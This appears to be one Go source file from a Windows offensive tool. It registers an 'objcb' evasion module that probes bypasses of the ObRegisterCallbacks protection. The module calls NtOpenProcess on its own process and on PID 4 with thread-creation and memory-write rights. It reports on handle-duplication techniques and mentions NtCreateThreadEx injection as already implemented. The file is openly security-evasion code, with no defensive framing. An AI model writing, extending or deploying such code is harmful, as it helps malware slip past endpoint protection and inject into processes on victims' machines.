//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	ntdllObjCB            = syscall.NewLazyDLL("ntdll.dll")
	procNtDuplicateObject = ntdllObjCB.NewProc("NtDuplicateObject")
	procNtOpenProcess     = ntdllObjCB.NewProc("NtOpenProcess")
)

const (
	PROCESS_DUP_HANDLE      = 0x0040
	PROCESS_SUSPEND_RESUME  = 0x0800
	PROCESS_SET_INFORMATION = 0x0200
	DUPLICATE_SAME_ACCESS   = 0x0002
	DUPLICATE_CLOSE_SOURCE  = 0x0001
	OBJ_CASE_INSENSITIVE    = 0x00000040
)

func init() {
	registerEvasion("objcb", runEvasionObjCB)
}

func runEvasionObjCB() string {
	result := ""

	result += "[*] ObRegisterCallbacks Bypass Techniques:\n"

	result += duplicateHandleBypass()

	result += openProcessBypass()

	result += "[*] Direct syscall injection: NtCreateThreadEx (already implemented)\n"

	return result
}

func duplicateHandleBypass() string {
	type objectAttributes struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))

	var hCurrentProcess uintptr
	ret, _, _ := procNtOpenProcess.Call(
		uintptr(unsafe.Pointer(&hCurrentProcess)),
		uintptr(PROCESS_DUP_HANDLE|PROCESS_QUERY_INFORMATION),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(uint32(syscall.Getpid())),
	)
	if ret != 0 {
		return fmt.Sprintf("[!] NtOpenProcess(self) failed: 0x%x\n", ret)
	}
	if hCurrentProcess != 0 {
		procCloseHandle.Call(hCurrentProcess)
	}

	return "[*] NtDuplicateObject: handle duplication technique available\n"
}

func openProcessBypass() string {
	type objectAttributes struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	var hProc uintptr
	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))
	oa.Attributes = OBJ_CASE_INSENSITIVE

	ret, _, _ := procNtOpenProcess.Call(
		uintptr(unsafe.Pointer(&hProc)),
		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(4),
	)
	if ret == 0 && hProc != 0 {
		procCloseHandle.Call(hProc)
		return fmt.Sprintf("[*] NtOpenProcess(PID=4, minimal access): succeeded (callbacks not blocking)\n")
	}

	var hProc2 uintptr
	var oa2 objectAttributes
	oa2.Length = uint32(unsafe.Sizeof(oa2))

	ret2, _, _ := procNtOpenProcess.Call(
		uintptr(unsafe.Pointer(&hProc2)),
		uintptr(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION),
		uintptr(unsafe.Pointer(&oa2)),
		uintptr(4),
	)

	if hProc2 != 0 {
		procCloseHandle.Call(hProc2)
	}
	_ = ret2

	return "[*] NtOpenProcess with minimal access: available as callback bypass\n"
}
